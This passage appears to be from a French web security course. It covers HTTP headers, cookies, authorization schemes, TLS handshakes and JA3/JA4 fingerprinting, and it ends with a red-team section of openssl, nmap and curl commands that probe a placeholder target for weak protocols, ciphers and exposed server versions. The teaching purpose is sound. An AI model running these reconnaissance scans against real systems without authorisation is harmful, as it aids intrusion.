| `Sec-CH-Device-Memory` / `Device-Memory` | `0.25, 0.5, 1, 2, 4, 8` (Go) | Mémoire approximative |
| `Sec-CH-Save-Data` / `Save-Data` | `on` | Mode économie de données → servir des ressources allégées |
| `Downlink` | `1.7` (Mb/s) | Bande passante estimée |
| `ECT` | `slow-2g`, `2g`, `3g`, `4g` | Type de connexion effectif |
| `RTT` | `150` (ms) | Latence estimée |
| `Sec-CH-Lang`, `Sec-CH-Prefers-Reduced-Data` *(expérimentaux)* | — | Langue / préférence de réduction de données |

**Réponse (RÉP) associée :** `Accept-CH`, `Critical-CH`, `Content-DPR` *(obsolète)*, et toujours **`Vary`** sur l'indice utilisé pour ne pas empoisonner le cache.

##### `DNT` (REQ, obsolète) / `Sec-GPC` (REQ) / `Tk` (RÉP, retiré)
`DNT: 1` (*Do Not Track*, abandonné). `Sec-GPC: 1` (*Global Privacy Control*) : signal juridiquement reconnu dans certains États (CCPA/CPRA) pour refuser la vente/le partage de données — le serveur doit s'y conformer.

---

#### 2.2.15 Reporting et observabilité

##### `Reporting-Endpoints` — RÉP *(moderne)*
Dictionnaire nommé de points de collecte : `Reporting-Endpoints: csp-endpoint="https://r.example.com/csp", default="https://r.example.com/all"`. Les noms sont ensuite référencés par `report-to` (CSP, COOP…).

##### `Report-To` — RÉP *(ancienne API, JSON)*
```http
Report-To: {"group":"default","max_age":10886400,"endpoints":[{"url":"https://r.example.com/reports"}],"include_subdomains":true}
```

##### `NEL` (Network Error Logging) — RÉP
```http
NEL: {"report_to":"default","max_age":2592000,"success_fraction":0.01,"failure_fraction":1.0,"include_subdomains":true}
```
Le navigateur signale les échecs réseau (DNS, TLS, timeout…) vers l'endpoint `default`. `success_fraction`/`failure_fraction` = taux d'échantillonnage.

---

#### 2.2.16 En-têtes de plateformes, CDN et frameworks (de facto)

| En-tête | Sens | Rôle / exemple | Traitement |
|---|---|---|---|
| `X-Powered-By` | RÉP | `X-Powered-By: PHP/8.3.2`, `Express`, `ASP.NET` | Divulgue la stack → à supprimer |
| `X-AspNet-Version`, `X-AspNetMvc-Version` | RÉP | Versions ASP.NET | À désactiver |
| `X-Generator` | RÉP | `Drupal 10`, `WordPress 6.x` | Divulgation, à masquer |
| `X-Runtime` | RÉP | Temps d'exécution Rails : `0.043` | Diagnostic |
| `X-Request-Start` | REQ | `t=1735000000.123` (timestamp ajouté par le proxy) | Mesure du temps de file d'attente |
| `X-Cache`, `X-Cache-Hits` | RÉP | `HIT`/`MISS` (Varnish, CloudFront) | Diagnostic cache |
| `X-Amz-Cf-Id`, `X-Amz-Cf-Pop` | RÉP | Identifiant / POP CloudFront | Support AWS |
| `CF-Ray`, `CF-Cache-Status`, `CF-IPCountry`, `CF-Visitor`, `CF-Worker` | REQ/RÉP | Cloudflare : `CF-Ray: 8a1b2c3d4e5f-CDG`, `CF-IPCountry: FR`, `CF-Visitor: {"scheme":"https"}`, `CF-Cache-Status: HIT/MISS/DYNAMIC/BYPASS/EXPIRED/REVALIDATED` | Géolocalisation/diagnostic |
| `X-Azure-Ref`, `X-Vercel-Id`, `X-Envoy-*`, `X-Served-By`, `X-Timer`, `X-Varnish` | RÉP | Identifiants d'infra | Diagnostic |
| `X-Redirect-By` | RÉP | `WordPress` | Indique qui a émis la redirection |
| `X-Pingback` | RÉP | URL XML-RPC WordPress | À désactiver si inutile (abus DDoS) |
| `X-Content-Security-Policy`, `X-WebKit-CSP` | RÉP | Anciens noms de CSP | **Obsolètes** |
| `X-Do-Not-Track`, `X-Content-Duration`, `X-ATT-DeviceId`, `X-Wap-Profile`, `X-UIDH`, `X-Requested-By` | REQ/RÉP | Divers historiques | Aucun traitement standard ; `X-UIDH` (identifiant de suivi opérateur) est un problème de vie privée |

---

#### 2.2.17 Autres en-têtes normalisés, spécialisés ou historiques

##### Service Workers, FedCM, Privacy Sandbox, stockage
| En-tête | Sens | Rôle et exemple |
|---|---|---|
| `Service-Worker` | REQ | `script` : identifie la requête de récupération du script du SW |
| `Service-Worker-Allowed` | RÉP | `/` : élargit la portée maximale du SW |
| `Service-Worker-Navigation-Preload` | REQ | Précharge la navigation pendant le démarrage du SW |
| `Set-Login` | RÉP | `logged-in` / `logged-out` (FedCM/Login Status API) |
| `Activate-Storage-Access` | RÉP | `retry; allowed-origin="https://a.example"` (Storage Access API) |
| `Sec-Private-State-Token`, `Sec-Private-State-Token-Crypto-Version`, `Sec-Private-State-Token-Lifetime`, `Sec-Redemption-Record` | REQ+RÉP | Jetons anti-fraude anonymes (Private State Tokens) |
| `Sec-Browsing-Topics` / `Observe-Browsing-Topics` | REQ/RÉP | API Topics : `?1` |
| `Sec-Ad-Auction-Fetch`, `Ad-Auction-Signals`, `Ad-Auction-Allowed`, `Sec-Ad-Auction-*` | REQ/RÉP | Protected Audience (enchères publicitaires) |
| `Attribution-Reporting-Eligible` / `Attribution-Reporting-Register-Source` / `-Trigger` | REQ/RÉP | Mesure publicitaire respectueuse de la vie privée |
| `Speculation-Rules` | RÉP | URL d'un JSON de règles de préchargement/prérendu : `"/rules.json"` |
| `Supports-Loading-Mode` | RÉP | `credentialed-prerender`, `fenced-frame` : opt-in aux chargements spéciaux |
| `Sec-Speculation-Tags` | REQ | Étiquettes des règles de spéculation |
| `Last-Event-ID` | REQ | Dernier ID d'événement reçu (reprise d'un flux SSE) : `Last-Event-ID: 42` |
| `Sec-Session-Registration`, `Sec-Secure-Session-Id` (DBSC) | RÉP/REQ | Cookies liés à l'appareil |

##### WebDAV / CalDAV / extensions de protocole
| En-tête | Sens | Rôle |
|---|---|---|
| `DAV` | RÉP | Classes de conformité : `1, 2, 3` |
| `Depth` | REQ | Profondeur d'application : `0`, `1`, `infinity` |
| `Destination` | REQ | Cible de `COPY`/`MOVE` : `Destination: /docs/copie.txt` |
| `Overwrite` | REQ | `T` (écraser) ou `F` (ne pas écraser → `412`) |
| `If` | REQ | Conditions sur ETag/verrous : `If: (<opaquelocktoken:…>)` |
| `Lock-Token` | REQ+RÉP | Jeton de verrou (`UNLOCK`/`LOCK`) |
| `Timeout` | REQ | Durée du verrou : `Second-3600`, `Infinite` |
| `Schedule-Reply`, `Schedule-Tag`, `If-Schedule-Tag-Match` | REQ/RÉP | CalDAV Scheduling |
| `Position`, `Ordering-Type`, `Apply-To-Redirect-Ref`, `Redirect-Ref`, `Label`, `Bulk`, `Nice`, `CalDAV-Timezones`, `Slug` | REQ/RÉP | Extensions WebDAV/AtomPub (`Slug: mon-article` suggère un nom de ressource) |

##### Anciens en-têtes HTTP/1.0, négociation transparente et divers
| En-tête | Statut | Rôle |
|---|---|---|
| `Digest`, `Want-Digest` | Obsolètes | Remplacés par `Content-Digest`/`Repr-Digest` |
| `Content-MD5` | Retiré | Empreinte MD5 du corps |
| `Warning` | Obsolète (RFC 9111) | Avertissements de cache : `110 - "Response is Stale"` |
| `Set-Cookie2` / `Cookie2` | Retirés | Anciens cookies RFC 2965 |
| `Proxy-Connection` | Non standard | `keep-alive` envoyé par d'anciens clients à un proxy |
| `Content-Version`, `Derived-From`, `Cost`, `URI`, `Title`, `Link-Template`, `Message-ID`, `MIME-Version`, `Content-ID`, `Content-Transfer-Encoding`, `Content-Base`, `Content-Script-Type`, `Content-Style-Type` | Historiques | Hérités de HTTP/1.0 / MIME, ignorés par la pratique |
| `Alternates`, `TCN`, `Variant-Vary`, `Negotiate`, `Accept-Features` | Historiques | *Transparent Content Negotiation* (RFC 2295) |
| `A-IM`, `IM`, `Delta-Base` | Rares | *Delta encoding* (RFC 3229) |
| `Ping-From`, `Ping-To` | Rares | Attribut `ping` des liens |
| `Safe`, `Differential-ID`, `Accept-Additions`, `Accept-Push-Policy`, `Accept-Signature` | Rares | Extensions spécifiques |
| `Sec-Purpose`, `Purpose` | Voir § 2.2.2 | Requêtes spéculatives |
| `Trailer`, `TE` | Voir § 2.2.4 | Champs de fin de message |

---

#### 2.2.18 Configuration de référence : un socle d'en-têtes de sécurité

```http
HTTP/1.1 200 OK
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{nonce}' 'strict-dynamic'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'; form-action 'self'; upgrade-insecure-requests
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Resource-Policy: same-origin
Cache-Control: no-store            # pour les pages authentifiées
Set-Cookie: __Host-session=…; Path=/; Secure; HttpOnly; SameSite=Lax
# À supprimer : Server, X-Powered-By, X-AspNet-Version, X-Generator
```

**Points de vigilance à retenir :**

| Risque | En-têtes concernés | Contre-mesure |
|---|---|---|
| XSS | `Content-Security-Policy`, `Set-Cookie (HttpOnly)`, `X-Content-Type-Options` | CSP stricte à nonce, `HttpOnly`, `nosniff` |
| CSRF | `Set-Cookie (SameSite)`, `Origin`, `Sec-Fetch-Site`, `X-CSRF-Token` | `SameSite=Lax/Strict`, contrôle d'origine, jeton |
| Clickjacking | `X-Frame-Options`, CSP `frame-ancestors` | `frame-ancestors 'none'` |
| Downgrade / MITM | `Strict-Transport-Security`, `Upgrade-Insecure-Requests` | HSTS + preload |
| Fuite d'informations | `Referer`, `Server`, `X-Powered-By`, `Referrer-Policy` | Politique stricte, suppression des bannières |
| Injection d'en-têtes / Smuggling | `Host`, `Location`, `Content-Length`, `Transfer-Encoding` | Validation, rejet des ambiguïtés, HTTP/2 de bout en bout |
| Usurpation d'IP | `X-Forwarded-For`, `Forwarded`, `X-Real-IP` | Écrasement par le proxy frontal, liste de proxys de confiance |
| CORS trop permissif | `Access-Control-Allow-Origin` + `Allow-Credentials` | Liste blanche + `Vary: Origin` |
| Fuite inter-sites (Spectre, XS-Leaks) | COOP/COEP/CORP, `Sec-Fetch-*` | Isolation cross-origin, *Resource Isolation Policy* |


### 2.3 Verbes HTTP, idempotence et sécurité

!!! note "Définitions"
    - **Sûr** (*Safe*) : l'opération ne modifie pas l'état du serveur.
    - **Idempotent** : l'application répétée de la même requête produit le même effet
      qu'une application unique (le résultat est identique quelle que soit la fréquence d'appel).
    - **Cache** : la réponse peut être mise en cache par les intermédiaires.

| Méthode | Sûre | Idempotente | Corps (req) | Corps (rép) | Sécurité |
|---|:---:|:---:|:---:|:---:|---|
| `GET` | ✅ | ✅ | ❌ | ✅ | Données sensibles ne doivent jamais passer en query string |
| `HEAD` | ✅ | ✅ | ❌ | ❌ | Identique à GET, utile pour le fingerprinting sans body |
| `OPTIONS` | ✅ | ✅ | Opt | ✅ | Révèle les méthodes autorisées — indicateur de reconnaissance |
| `POST` | ❌ | ❌ | ✅ | ✅ | Risque CSRF si sans token ; idéal pour les actions non-idempotentes |
| `PUT` | ❌ | ✅ | ✅ | Opt | Remplacement complet d'une ressource — contrôle d'accès critique |
| `PATCH` | ❌ | ❌ | ✅ | Opt | Modification partielle — souvent moins protégé que PUT |
| `DELETE` | ❌ | ✅ | Opt | Opt | Action destructrice — authentification forte requise |
| `TRACE` | ✅ | ✅ | ❌ | ✅ | **Désactiver obligatoirement** — facilite Cross-Site Tracing (XST) |
| `CONNECT` | ❌ | ❌ | — | — | Création de tunnels HTTP — risque de proxy ouvert |

!!! danger "TRACE et Cross-Site Tracing (XST)"
    La méthode `TRACE` fait écho à la requête reçue dans la réponse. Combinée à XSS, elle permet
    de lire les en-têtes `HttpOnly` cookies via `XMLHttpRequest` sur les navigateurs anciens.
    **Toujours désactiver `TRACE` sur les serveurs web.**
    ```apache
    # Apache — désactivation de TRACE
    TraceEnable off
    ```
    ```nginx
    # Nginx — TRACE non supporté nativement, bloquer via limit_except
    limit_except GET HEAD POST PUT DELETE PATCH OPTIONS { deny all; }
    ```

### 2.4 Structure d'une réponse HTTP

```http
HTTP/1.1 200 OK
Date: Wed, 09 Sep 2026 14:30:00 GMT
Server: nginx/1.26.0                          ← Attention : révèle la version du serveur
Content-Type: application/json; charset=utf-8
Content-Length: 156
Cache-Control: no-store, no-cache, must-revalidate
X-Request-ID: 7f3a2b1c-4d5e-6f7a-8b9c-0d1e2f3a4b5c
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Content-Security-Policy: default-src 'self'
Referrer-Policy: strict-origin-when-cross-origin

{"status":"ok","data":{"id":42,"role":"user","email":"user@example.com"}}
```

**Codes de statut HTTP — référence complète :**

```text
1xx — Informationnel
  100 Continue           : Le client peut continuer d'envoyer le corps de la requête
  101 Switching Protocols: Upgrade (ex : HTTP → WebSocket)
  103 Early Hints        : Préchargement de ressources (Link headers)

2xx — Succès
  200 OK                 : Requête traitée avec succès
  201 Created            : Ressource créée (POST/PUT réussi)
  204 No Content         : Succès sans corps de réponse (ex : DELETE)
  206 Partial Content    : Réponse partielle (plage d'octets)

3xx — Redirection
  301 Moved Permanently  : Redirection permanente (mise en cache par les navigateurs)
  302 Found              : Redirection temporaire
  304 Not Modified       : Ressource non modifiée (utiliser le cache local)
  307 Temporary Redirect : Redirection temporaire, préserve la méthode HTTP
  308 Permanent Redirect : Redirection permanente, préserve la méthode HTTP

4xx — Erreur client
  400 Bad Request        : Requête malformée
  401 Unauthorized       : Authentification requise ou invalide
  403 Forbidden          : Accès refusé (authentifié mais non autorisé)
  404 Not Found          : Ressource inexistante
  405 Method Not Allowed : Méthode HTTP non supportée pour cette URI
  408 Request Timeout    : Délai d'attente dépassé
  413 Payload Too Large  : Corps de requête trop volumineux
  429 Too Many Requests  : Rate limiting déclenché
  451 Unavailable For Legal Reasons : Blocage pour raisons légales

5xx — Erreur serveur
  500 Internal Server Error : Erreur générique côté serveur
  501 Not Implemented       : Méthode non implémentée
  502 Bad Gateway           : Réponse invalide du backend (reverse proxy)
  503 Service Unavailable   : Serveur temporairement indisponible (maintenance, surcharge)
  504 Gateway Timeout       : Délai backend dépassé (reverse proxy)
```

!!! warning "Codes de statut comme vecteur d'information"
    Les codes 401 vs 403, 404 vs 403, ou la présence d'un `500` avec stack trace constituent
    des fuites d'information exploitables pour la reconnaissance. Configurer des pages d'erreur
    génériques sans message technique exposé au client.

### 2.5 Gestion de la persistance & sessions

#### Cookies et leurs attributs de sécurité

```http
Set-Cookie: session_id=a3f2b9d1e4c7; \
  HttpOnly; \
  Secure; \
  SameSite=Strict; \
  Path=/; \
  Domain=example.com; \
  Max-Age=3600; \
  Partitioned
```

| Attribut | Effet | Absence = risque |
|---|---|---|
| `HttpOnly` | Interdit l'accès JS (`document.cookie`) | XSS peut voler le cookie |
| `Secure` | Transmis uniquement sur HTTPS | Cookie visible en HTTP clair (MitM, reniflage) |
| `SameSite=Strict` | Envoyé uniquement pour requêtes same-site | CSRF possible |
| `SameSite=Lax` | Envoyé pour navigation top-level cross-site (GET) | CSRF partiel |
| `SameSite=None; Secure` | Envoyé pour toutes les requêtes (cross-site) | Obligatoire d'avoir `Secure` |
| `Max-Age` / `Expires` | Durée de vie côté client | Session persistante indéfiniment sans expiration |
| `Domain` | Sous-domaines inclus si préfixé par `.` | Partage de cookie entre sous-domaines |
| `Path` | Restriction à un chemin URL | Accès par d'autres chemins de la même origine |
| `__Host-` prefix | Force `Secure`, `Path=/`, pas de `Domain` | Plus forte garantie d'origine |
| `__Secure-` prefix | Force `Secure` | Moins strict que `__Host-` |

```javascript
// JavaScript — accès à document.cookie sans HttpOnly
document.cookie
// → "session_id=a3f2b9d1e4c7; csrftoken=XYZ789"
// Avec HttpOnly : session_id n'apparaît pas — protégé contre XSS

// Test de détection : si le cookie de session n'est pas visible ici → HttpOnly présent
```

#### En-têtes d'autorisation

```http
# Basic Auth : base64(identifiant:motdepasse) — JAMAIS en HTTP clair
Authorization: Basic dXNlcjpwYXNzd29yZA==
# → base64_decode("dXNlcjpwYXNzd29yZA==") = "user:password" (trivial à décoder)

# Bearer Token (JWT) — à transmettre exclusivement via HTTPS
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9\
  .eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzY3MDAwMDAwfQ\
  .SIG...

# Décodage du payload JWT (sans vérification de signature — outil : jwt.io)
# Header: {"alg":"RS256","typ":"JWT"}
# Payload: {"sub":"1234567890","role":"admin","iat":1767000000}
# Signature: [vérifiable uniquement avec la clé publique du serveur]

# Digest Auth (obsolète — vulnérable à des attaques hors ligne sur le condensat MD5)
Authorization: Digest username="user", realm="example.com", nonce="...", uri="/path",
               response="[MD5_hash]", algorithm=MD5

# API Key (pattern courant — à mettre en en-tête, jamais en query string)
X-API-Key: sk-prod-abcdef1234567890
```

!!! danger "Basic Auth et Basic Auth en clair"
    L'encodage Base64 n'est PAS un chiffrement. Une capture réseau sur un trafic HTTP (sans TLS)
    révèle immédiatement les identifiants. Même sur HTTPS, Basic Auth est déconseillé en production
    au profit de OAuth 2.0 / OpenID Connect ou de tokens à durée de vie courte.

---

## 3. Fonctionnement interne de HTTPS & Handshake TLS

### 3.1 Les trois piliers cryptographiques de TLS

| Objectif | Mécanisme TLS | Algorithme typique |
|---|---|---|
| **Confidentialité** | Chiffrement symétrique du flux de données | AES-256-GCM, ChaCha20-Poly1305 |
| **Intégrité** | AEAD (Authenticated Encryption with Associated Data) | Tag d'intégrité inclus dans AEAD |
| **Authentification** | Certificats X.509 signés par une CA de confiance | RSA-2048/4096, ECDSA P-256/P-384 |
| **PFS** | Échange de clés éphémère Diffie-Hellman | ECDHE (courbes X25519, P-256) |

### 3.2 Handshake TLS 1.3 — Analyse pas-à-pas (1-RTT)

```text
TLS 1.3 Handshake — diagramme de séquence complet

Client                                                    Server
  │                                                         │
  │──── ClientHello ──────────────────────────────────────► │
  │     ├─ supported_versions: [TLS 1.3, TLS 1.2]          │
  │     ├─ cipher_suites: [AES_256_GCM_SHA384,             │
  │     │                   CHACHA20_POLY1305_SHA256,       │
  │     │                   AES_128_GCM_SHA256]             │
  │     ├─ client_random: [32 octets aléatoires]           │
  │     ├─ key_share: [X25519 public key du client]        │
  │     ├─ server_name (SNI): "api.example.com"            │
  │     └─ supported_groups: [x25519, secp256r1, secp384r1]│
  │                                                         │
  │◄─── ServerHello ──────────────────────────────────────  │
  │     ├─ selected_version: TLS 1.3                        │
  │     ├─ cipher_suite: TLS_AES_256_GCM_SHA384             │
  │     ├─ server_random: [32 octets aléatoires]           │
  │     └─ key_share: [X25519 public key du serveur]       │
  │                                                         │
  │  [Les deux parties dérivent indépendamment              │
  │   le secret partagé via ECDH(E) sur X25519 :           │
  │   shared_secret = DH(client_private, server_public)    │
  │                 = DH(server_private, client_public)     │
  │   → Handshake keys → Application keys via HKDF]        │
  │                                                         │
  │◄─── {EncryptedExtensions} ──────────────────────────── │  ← CHIFFRÉ dès ici
  │     └─ ALPN: "h2", early_data, max_fragment_length      │
  │                                                         │
  │◄─── {Certificate} ──────────────────────────────────── │
  │     └─ Certificat X.509 du serveur (DER encodé)        │
  │        ├─ CN/SAN: api.example.com                       │
  │        ├─ Issuer: Let's Encrypt Authority X3            │
  │        ├─ Validity: 2026-07-01 → 2026-10-01            │
  │        └─ Public Key: ECDSA P-256                       │
  │                                                         │
  │◄─── {CertificateVerify} ────────────────────────────── │
  │     └─ Signature ECDSA sur la transcription du handshake│
  │        (prouve la possession de la clé privée associée │
  │         au certificat présenté)                         │
  │                                                         │
  │◄─── {Finished} ─────────────────────────────────────── │
  │     └─ HMAC-SHA384 sur la transcription complète       │
  │        (authentifie l'intégralité du handshake serveur) │
  │                                                         │
  │──── {Finished} ─────────────────────────────────────── ►│
  │     └─ HMAC-SHA384 sur la transcription complète        │
  │        (authentifie l'intégralité du handshake client)  │
  │                                                         │
  │◄══════════════ Données applicatives chiffrées ═════════►│
  │   {Application Data} HTTP/2 ou HTTP/1.1 sur TLS        │
```

!!! note "Clés éphémères et Perfect Forward Secrecy (PFS)"
    Dans TLS 1.3, **toutes** les suites de chiffrement utilisent ECDHE (Elliptic Curve
    Diffie-Hellman Ephemeral). Les clés générées pour chaque session sont jetées après usage.
    Si un attaquant capture le trafic chiffré aujourd'hui et obtient la clé privée du serveur
    demain, il **ne pourra toujours pas déchiffrer** les sessions passées, car les clés de
    session éphémères n'existent plus. TLS 1.2 avec RSA statique (sans ECDHE) ne garantit
    **pas** la PFS.

### 3.3 Handshake TLS 1.2 — Comparaison (2-RTT)

```text
TLS 1.2 Handshake — diagramme simplifié (2 allers-retours)

Client                                               Server
  │                                                    │
  │──── ClientHello ─────────────────────────────────►│   RTT 1 (aller)
  │     ├─ Version max supportée: TLS 1.2              │
  │     ├─ client_random                               │
  │     └─ cipher_suites (liste variable)              │
  │                                                    │
  │◄─── ServerHello ─────────────────────────────────  │   RTT 1 (retour)
  │◄─── Certificate                                    │
  │◄─── ServerKeyExchange (si ECDHE/DHE)               │
  │◄─── ServerHelloDone                                │
  │                                                    │
  │──── ClientKeyExchange ───────────────────────────►│   RTT 2 (aller)
  │     └─ pre-master secret chiffré avec clé publique │
  │        du serveur (RSA) OU contribution DH client   │
  │──── ChangeCipherSpec ─────────────────────────────►│
  │──── Finished ─────────────────────────────────────►│
  │                                                    │
  │◄─── ChangeCipherSpec ────────────────────────────  │   RTT 2 (retour)
  │◄─── Finished                                       │
  │                                                    │
  │◄══════════ Application Data chiffrées ════════════►│
```

**Comparaison TLS 1.2 vs TLS 1.3 :**

| Critère | TLS 1.2 | TLS 1.3 |
|---|---|---|
| Nombre de RTT | 2 | 1 (+ 0-RTT optionnel) |
| Échange de clés | RSA ou DHE/ECDHE | ECDHE **uniquement** |
| PFS | Optionnelle (dépend de la suite) | **Obligatoire** |
| Suites de chiffrement | >300 dont des faibles | 5 uniquement, toutes AEAD |
| Chiffrement du handshake | Partiel (Finished seulement) | Dès ServerHello (certificat chiffré) |
| Compression TLS | Supportée (CRIME vulnérable) | **Supprimée** |
| Renégociation | Supportée (vulnérable) | **Supprimée** |
| 0-RTT | Non | Optionnel (avec risques) |

### 3.4 Validation de la chaîne de confiance X.509

```text
Chaîne de certificats (Chain of Trust) :

┌─────────────────────────────────────────────────────┐
│             Root CA (Autorité Racine)               │
│  Certificat auto-signé, stocké dans le magasin      │
│  de certificats du système d'exploitation /         │
│  navigateur (Mozilla NSS, Microsoft Root Store...)  │
│                                                     │
│  CN: DST Root CA X3  ──── signé par lui-même       │
└───────────────────────┬─────────────────────────────┘
                        │ signe (RSA/ECDSA)
┌───────────────────────▼─────────────────────────────┐
│          Intermediate CA (CA Intermédiaire)         │
│  Signé par la Root CA. Les Root CA signent rarement │
│  directement — les intermédiaires sont révoqués      │
│  plus facilement.                                   │
│                                                     │
│  CN: Let's Encrypt R11  ──── signé par DST Root    │
└───────────────────────┬─────────────────────────────┘
                        │ signe (RSA/ECDSA)
┌───────────────────────▼─────────────────────────────┐
│          Certificat d'entité finale (Leaf)          │
│  Présenté par le serveur lors du handshake TLS.     │
│  Validé par le client :                             │
│   1. Signature de l'intermédiaire vérifiable        │
│   2. Période de validité non expirée                │
│   3. SAN (Subject Alt Names) = hostname contacté   │
│   4. Non révoqué (CRL / OCSP)                      │
│                                                     │
│  CN: api.example.com   ──── signé par Let's Encrypt │
└─────────────────────────────────────────────────────┘
```

**Mécanismes de révocation :**

```bash
# OCSP (Online Certificate Status Protocol) — vérification en temps réel
# Le client interroge le répondeur OCSP de la CA pour l'état du certificat

# OCSP Stapling : le SERVEUR pré-récupère et met en cache la réponse OCSP signée
# (évite la latence d'une requête OCSP supplémentaire du client + préserve la vie privée)
openssl s_client -connect api.example.com:443 -status 2>/dev/null | grep -A 10 "OCSP Response"
# OCSP Response Status: successful (0x0)
# This Update: Sep  1 00:00:00 2026 GMT
# Next Update: Sep  8 00:00:00 2026 GMT

# Vérification manuelle de la chaîne de certificats
openssl s_client -connect api.example.com:443 -showcerts 2>/dev/null \
    | openssl x509 -noout -text | grep -E "Subject:|Issuer:|Not After|SAN"
```

### 3.5 Reprise de session (Session Resumption) et 0-RTT

```text
Session Resumption (TLS 1.3 — Session Tickets) :

Connexion initiale :
  Client ──── Handshake complet 1-RTT ────► Server
         ◄─── {NewSessionTicket} ─────────  Server
               └─ ticket chiffré avec clé serveur (masque la clé de session)

Connexion suivante (1-RTT standard) :
  Client ──── ClientHello + session_ticket ─►Server
         ◄─── ServerHello + Finished ──────  Server
         ══════ Application Data ═══════════►

0-RTT (Early Data) :
  Client ──── ClientHello + session_ticket ─►Server
              + {Early Data} ──────────────►         ← données envoyées AVANT Finished
         ◄─── ServerHello + Finished ──────  Server
         ══════ Application Data ═══════════►
```

!!! danger "Risque Replay avec le 0-RTT"
    Les données `Early Data` (0-RTT) **ne sont pas protégées contre les attaques par rejeu**.
    Un attaquant ayant capturé un ClientHello avec Early Data peut le rejouer sur le même serveur
    ou un autre nœud du cluster, déclenchant à nouveau l'action transportée (idéal pour un
    attaquant visant une action à effet de bord : `POST /payment/process`).
    **Recommandation** : limiter le 0-RTT aux requêtes strictement idempotentes (`GET`, `HEAD`)
    ou le désactiver complètement si le serveur ne peut pas valider l'absence de rejeu.

---

## 4. Empreinte, Fuzzing & Détection

### 4.1 TLS Fingerprinting — JA3 & JA4

Le **JA3** est un fingerprint calculé côté serveur à partir des champs du ClientHello,
permettant d'identifier le client TLS sans connaissance du contenu applicatif.

```text
Calcul du fingerprint JA3 :

JA3 = MD5( SSLVersion , Ciphers , Extensions , EllipticCurves , EllipticCurvePointFormats )
         └── séparés par des virgules, chaque liste par des tirets

Exemple :
  SSLVersion   : 771  (= TLS 1.2 en décimal)
  Ciphers      : 49195-49199-49196-49200-52393-52392-49161
  Extensions   : 0-23-65281-10-11-35-16-5-13-18-51-45-43-21
  Groups       : 29-23-24
  PointFormats : 0

JA3 string : "771,49195-...,0-23-...,29-23-24,0"
JA3 hash   : MD5("771,49195-...") = "a0e9f5d64349fb13191bc781f81f42e1"

→ Ce hash est identique pour tout client utilisant Chrome 120 sur Linux,
  quelle que soit la destination contactée.
```

```text
JA4 (format amélioré, 2023) :

JA4 = t{TLS version}{SNI yn}{nb ciphers}{nb extensions}{ALPN 1er et 2e char}_{ciphers triés}_{extensions triées sans SNI/ALPN}

Exemple JA4 : t13d1516h2_8daaf6152771_e5627efa2ab1

Avantages par rapport à JA3 :
- Plus stable (moins affecté par l'ordre des extensions)
- Lisible (version TLS directement visible)
- Décomposable en segments pour les règles de détection
```

```python
# Capture de la JA3 hash via scapy (exemple conceptuel)
from scapy.all import sniff, TLS

def extract_ja3(pkt):
    if pkt.haslayer(TLS) and pkt[TLS].type == 1:  # ClientHello
        tls = pkt[TLS]
        # Extraire : version, cipher suites, extensions, courbes, point formats
        ja3_components = build_ja3_string(tls)
        ja3_hash = hashlib.md5(ja3_components.encode()).hexdigest()
        print(f"Source IP: {pkt['IP'].src} → JA3: {ja3_hash}")

sniff(iface="eth0", filter="tcp port 443", prn=extract_ja3)
```

### 4.2 HTTP Header Order Fingerprinting

Différents clients HTTP envoient les en-têtes dans des ordres distincts et prévisibles,
permettant d'identifier le type de client même sans JavaScript.

```text
Exemple de fingerprint par ordre d'en-têtes :

Chrome (Linux) :
  Host → Connection → Content-Length → Cache-Control → sec-ch-ua → sec-ch-ua-Mobile →
  User-Agent → sec-ch-ua-Platform → Accept → Origin → Referer → Accept-Encoding →
  Accept-Language → Cookie

curl/7.x :
  Host → User-Agent → Accept → Content-Type → Content-Length

Python requests/2.x :
  Host → User-Agent → Accept-Encoding → Accept → Connection → Content-Type → Content-Length

→ Un bot se faisant passer pour Chrome mais envoyant les en-têtes dans l'ordre "requests"
  est immédiatement identifiable par ce fingerprint.
```

### 4.3 Inspection Red Team

```bash
# Analyse détaillée du handshake TLS et des en-têtes HTTP
curl -v --tls13-ciphers TLS_AES_256_GCM_SHA384 \
     --tlsv1.3 \
     -H "User-Agent: Mozilla/5.0" \
     https://api.example.com/endpoint 2>&1 | head -60

# Résultat type :
# *   Trying 93.184.216.34:443...
# * Connected to api.example.com (93.184.216.34) port 443
# * ALPN: curl offers h2,http/1.1
# * TLSv1.3 (OUT), TLS handshake, Client hello (1):
# * TLSv1.3 (IN), TLS handshake, Server hello (2):
# * TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
# * TLSv1.3 (IN), TLS handshake, Certificate (11):
# * TLSv1.3 (IN), TLS handshake, CERT verify (15):
# * TLSv1.3 (IN), TLS handshake, Finished (20):
# * TLSv1.3 (OUT), TLS handshake, Finished (20):
# * SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384
# * ALPN: server accepted h2

# Inspection complète du certificat et de la chaîne
openssl s_client \
    -connect api.example.com:443 \
    -servername api.example.com \
    -showcerts \
    -status \          # Demander l'OCSP Stapling
    2>/dev/null | openssl x509 -noout -text

# Test de protocoles obsolètes (SSLv3, TLS 1.0, TLS 1.1)
openssl s_client -connect cible.com:443 -ssl3 2>&1 | grep -E "CONNECTED|error"
openssl s_client -connect cible.com:443 -tls1   2>&1 | grep -E "CONNECTED|error"
openssl s_client -connect cible.com:443 -tls1_1 2>&1 | grep -E "CONNECTED|error"
# Si "CONNECTED" → protocole obsolète supporté → vulnérable aux attaques de downgrade

# Énumération des cipher suites supportées
nmap --script ssl-enum-ciphers -p 443 cible.com
# Résultat : liste complète des ciphers avec note de sécurité (A/B/C/F)
```

```bash
# Analyse HTTP brute — inspection des en-têtes de réponse complets
curl -s -I -X GET https://cible.com/ | \
    grep -E "Server:|X-Powered-By:|Set-Cookie:|X-Frame:|CSP:|HSTS:|X-Content:"
# Recherche de :
# - Server: nginx/1.14.0  → version exposée
# - X-Powered-By: PHP/7.4 → langage et version exposés
